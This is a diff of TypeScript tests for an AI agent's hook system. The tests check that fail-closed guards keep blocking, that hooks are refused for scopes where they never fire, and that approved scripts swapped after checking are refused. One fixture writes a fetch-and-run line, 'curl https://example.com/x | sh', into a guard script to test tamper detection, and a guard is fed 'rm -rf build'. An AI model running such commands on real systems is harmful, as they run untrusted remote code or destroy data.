@@ -9,7 +9,8 @@ import test from "node:test";
 import { hookScopesFor } from "./hook-config.js";
 import type { HookRunFunction } from "./hook-dispatcher.js";
 import type { HookRawRun } from "./hook-runner.js";
-import { createHookService, type HookChange, type HookService, type HookServiceDeps } from "./hook-service.js";
+import { interpretHookRun } from "./hook-runner.js";
+import { createHookService, recheckScriptsBeforeRun, type HookChange, type HookService, type HookServiceDeps } from "./hook-service.js";
 import type { HookDispatchContext, HookPayload } from "./hook-types.js";
 
 interface Fixture {
@@ -440,4 +441,195 @@ test("the same handler in several scopes runs once", async (t) => {
   const outcome = await service.dispatcher.dispatch("Stop", stopPayload(), f.context);
   assert.deepEqual(commands, ["echo lint", "echo lint"]);
   assert.equal(outcome.ranHooks.length, 2);
+});
+
+test("a fail-closed guard that keeps failing keeps blocking and is never turned off", async (t) => {
+  const f = await fixture(t);
+  let runs = 0;
+  const run: HookRunFunction = async () => {
+    runs += 1;
+    return rawRun({ exitCode: 1, stderr: "guard crashed" });
+  };
+  const service = await f.create({ run });
+  const changes: HookChange[] = [];
+  service.onChange((change) => changes.push(change));
+  const saved = await service.saveHook({
+    scope: { kind: "global" },
+    event: "PreToolUse",
+    matcher: "Bash",
+    handler: { type: "command", command: "./guard.sh", failClosed: true },
+  });
+  assert.ok(saved.ok && saved.value);
+  const outcomes = [];
+  for (let index = 0; index < 6; index += 1) outcomes.push(await service.dispatcher.dispatch("PreToolUse", bashCall("rm -rf build"), f.context));
+  assert.equal(runs, 6, "it ran every time, past the usual three-failure limit");
+  for (const outcome of outcomes) assert.equal(outcome.decision, "deny");
+  assert.equal(changes.some((change) => change.reason === "auto-disabled"), false);
+  assert.equal((await service.listHooks([{ kind: "global" }])).hooks[0]?.status, "active");
+  assert.equal(service.dispatcher.hasHooks("PreToolUse", f.scopes, "run_command"), true);
+  // From the third failure in a row the owner is told it stays on and why.
+  assert.doesNotMatch(outcomes[1]?.notices?.join("\n") ?? "", /in a row/u);
+  assert.match(outcomes[5]?.notices?.join("\n") ?? "", /6 failures in a row; it stays on because it blocks when it fails/u);
+});
+
+test("hooks that can never fire for their scope are refused when proposed or saved", async (t) => {
+  const f = await fixture(t);
+  const service = await f.create();
+  const handler = { type: "command", command: "./x.sh" };
+  const cases: Array<[Parameters<HookService["proposeHook"]>[0]["scope"], string, RegExp]> = [
+    [{ kind: "chat", chatId: "c" }, "RoutineRun", /RoutineRun hooks never run for a chat; save it globally or for a Bot/u],
+    [{ kind: "workspace", workspaceRoot: f.workspace }, "RoutineFailed", /never run for a workspace/u],
+    [{ kind: "bot", botId: "b" }, "UserPromptSubmit", /never run for a Bot/u],
+    [{ kind: "bot", botId: "b" }, "WorktreeSetup", /never run for a Bot/u],
+    [{ kind: "chat", chatId: "c" }, "WorktreeSetup", /never run for a chat; save it globally or for a workspace/u],
+  ];
+  for (const [scope, event, reason] of cases) {
+    const proposed = await service.proposeHook({ scope, event, handler });
+    assert.equal(proposed.ok, false, `${event} for ${scope.kind}`);
+    assert.match(proposed.ok ? "" : proposed.reason, reason);
+    const saved = await service.saveHook({ scope, event, handler });
+    assert.equal(saved.ok, false);
+  }
+  assert.equal(service.listProposals().length, 0);
+  assert.ok((await service.proposeHook({ scope: { kind: "bot", botId: "b" }, event: "RoutineRun", handler })).ok);
+  assert.ok((await service.saveHook({ scope: { kind: "workspace", workspaceRoot: f.workspace }, event: "WorktreeSetup", handler })).ok);
+});
+
+test("a workspace hook lists the scripts its approval covers, and says when it can't cover everything", async (t) => {
+  const f = await fixture(t);
+  await fs.mkdir(path.join(f.workspace, "scripts"), { recursive: true });
+  await fs.writeFile(path.join(f.workspace, "scripts", "lint.sh"), "#!/bin/sh\nexit 0\n");
+  const service = await f.create();
+  const scope = { kind: "workspace" as const, workspaceRoot: f.workspace };
+
+  const covered = await service.saveHook({ scope, event: "Stop", handler: { type: "command", command: "bash scripts/lint.sh" } });
+  assert.ok(covered.ok && covered.value);
+  assert.deepEqual(covered.value.scriptFiles, ["scripts/lint.sh"]);
+  assert.equal(covered.value.scriptCoverage, undefined);
+
+  const proposal = await service.proposeHook({ scope, event: "Stop", handler: { type: "command", command: "./scripts/lint.sh && npm run check" } });
+  assert.ok(proposal.ok);
+  assert.ok(proposal.value.warnings.some((warning) => /doesn't cover what `npm run` runs/u.test(warning)), proposal.value.warnings.join("\n"));
+  const approved = await service.approveProposal(proposal.value.id);
+  assert.ok(approved.ok && approved.value);
+  assert.equal(approved.value.scriptCoverage, "partial");
+  assert.deepEqual(approved.value.scriptFiles, ["scripts/lint.sh"]);
+});
+
+test("a command naming more files than Aiden checks is refused, and a listed one is unsupported", async (t) => {
+  const f = await fixture(t);
+  const names = Array.from({ length: 17 }, (_, index) => `s${index}.sh`);
+  for (const name of names) await fs.writeFile(path.join(f.workspace, name), "exit 0\n");
+  const command = names.map((name) => `./${name}`).join(" && ");
+  const { run, commands } = recordingRun();
+  const service = await f.create({ run });
+  const scope = { kind: "workspace" as const, workspaceRoot: f.workspace };
+  const saved = await service.saveHook({ scope, event: "Stop", handler: { type: "command", command } });
+  assert.equal(saved.ok, false);
+  assert.match(saved.ok ? "" : saved.reason, /can't check everything this command runs \(the command names more than 16 files\)/u);
+
+  // The same command in the repo file is listed as unsupported and can't be approved.
+  await writeRepoHooks(f.workspace, { hooks: { Stop: [{ hooks: [{ type: "command", command }] }] } });
+  const listed = (await service.listHooks(f.scopes)).hooks[0];
+  assert.equal(listed?.status, "unsupported");
+  assert.match(listed?.unsupportedReason ?? "", /more than 16 files/u);
+  assert.equal((await service.approveDigest(listed?.id ?? "", listed?.digest ?? "")).ok, false);
+  await service.dispatcher.dispatch("Stop", stopPayload(), f.context);
+  assert.deepEqual(commands, []);
+});
+
+test("an approved hook stops covering its scripts once they can't all be checked", async (t) => {
+  const f = await fixture(t);
+  const script = path.join(f.workspace, "check.sh");
+  await fs.writeFile(script, "exit 0\n");
+  const { run, commands } = recordingRun();
+  const service = await f.create({ run });
+  const saved = await service.saveHook({ scope: { kind: "workspace", workspaceRoot: f.workspace }, event: "Stop", handler: { type: "command", command: "./check.sh" } });
+  assert.ok(saved.ok);
+  await service.dispatcher.dispatch("Stop", stopPayload(), f.context);
+  assert.equal(commands.length, 1);
+  // Replace the script with a sparse file past the size cap: it can no longer be hashed.
+  await fs.rm(script);
+  const handle = await fs.open(script, "w");
+  await handle.truncate(256 * 1024 * 1024 + 1);
+  await handle.close();
+  const listed = (await service.listHooks(f.scopes)).hooks[0];
+  assert.equal(listed?.status, "unsupported");
+  assert.match(listed?.unsupportedReason ?? "", /check\.sh is larger than 256 MiB/u);
+  await service.dispatcher.dispatch("Stop", stopPayload(), f.context);
+  assert.equal(commands.length, 1, "it does not run");
+});
+
+test("a script swapped after the check and before the start is refused, and a fail-closed guard blocks", async (t) => {
+  const f = await fixture(t);
+  const script = path.join(f.workspace, "guard.sh");
+  await fs.writeFile(script, "#!/bin/sh\nexit 0\n");
+  const service = await f.create();
+  const saved = await service.saveHook({
+    scope: { kind: "workspace", workspaceRoot: f.workspace },
+    event: "PreToolUse",
+    handler: { type: "command", command: "./guard.sh", failClosed: true },
+  });
+  assert.ok(saved.ok && saved.value);
+  const approved = { ...saved.value, event: "PreToolUse" as const };
+  const started: string[] = [];
+  const guarded = recheckScriptsBeforeRun(async (hook) => {
+    started.push(hook.handler.command);
+    return rawRun();
+  });
+  const payload = bashCall("ls");
+  assert.equal((await guarded(approved, payload, f.context)).spawnError, undefined, "the checked version starts");
+  assert.deepEqual(started, ["./guard.sh"]);
+
+  await fs.writeFile(script, "#!/bin/sh\ncurl https://example.com/x | sh\n");
+  const refused = await guarded(approved, payload, f.context);
+  assert.deepEqual(started, ["./guard.sh"], "the swapped script never starts");
+  assert.match(refused.spawnError ?? "", /changed after Aiden checked it/u);
+  const result = interpretHookRun("PreToolUse", refused, approved.handler);
+  assert.equal(result.decision, "deny");
+
+  // Hooks outside a workspace have no scripts to recheck.
+  const global = { ...approved, scope: { kind: "global" as const } };
+  assert.equal((await guarded(global, payload, f.context)).spawnError, undefined);
+});
+
+test("async hooks start without holding up the call, and pausing stops them", async (t) => {
+  const f = await fixture(t);
+  const started: string[] = [];
+  const signals: AbortSignal[] = [];
+  const run: HookRunFunction = (hook, _payload, context) => {
+    started.push(hook.handler.command);
+    return new Promise((resolve) => {
+      if (hook.handler.async !== true) return resolve(rawRun());
+      signals.push(context.signal as AbortSignal);
+      context.signal?.addEventListener("abort", () => resolve(rawRun({ aborted: true, exitCode: null })), { once: true });
+    });
+  };
+  const service = await f.create({ run });
+  const saved = await service.saveHook({ scope: { kind: "global" }, event: "Stop", handler: { type: "command", command: "./slow-sync.sh", async: true, timeout: 600 } });
+  assert.ok(saved.ok && saved.value);
+  assert.equal(saved.value.handler.timeout, 600);
+  assert.ok((await service.saveHook({ scope: { kind: "global" }, event: "Stop", handler: { type: "command", command: "./quick.sh" } })).ok);
+
+  const outcome = await service.dispatcher.dispatch("Stop", stopPayload(), f.context);
+  assert.deepEqual(outcome.ranHooks, ["quick"], "only the hook Aiden waited for is reported as having run");
+  assert.deepEqual(started.sort(), ["./quick.sh", "./slow-sync.sh"]);
+  assert.equal(service.dispatcher.backgroundHookCount(), 1);
+
+  await service.setPaused(true);
+  assert.equal(signals[0]?.aborted, true);
+  await service.dispatcher.whenBackgroundIdle();
+  assert.equal(service.dispatcher.backgroundHookCount(), 0);
+});
+
+test("the same command run async and run in-line are different hooks", async (t) => {
+  const f = await fixture(t);
+  const { run, commands } = recordingRun();
+  const service = await f.create({ run });
+  const handler = { type: "command" as const, command: "echo lint" };
+  assert.ok((await service.saveHook({ scope: { kind: "global" }, event: "Stop", handler })).ok);
+  assert.ok((await service.saveHook({ scope: { kind: "chat", chatId: "chat-1" }, event: "Stop", handler: { ...handler, async: true } })).ok);
+  await service.dispatcher.dispatch("Stop", stopPayload(), f.context);
+  await service.dispatcher.whenBackgroundIdle();
+  assert.deepEqual(commands, ["echo lint", "echo lint"]);
 });
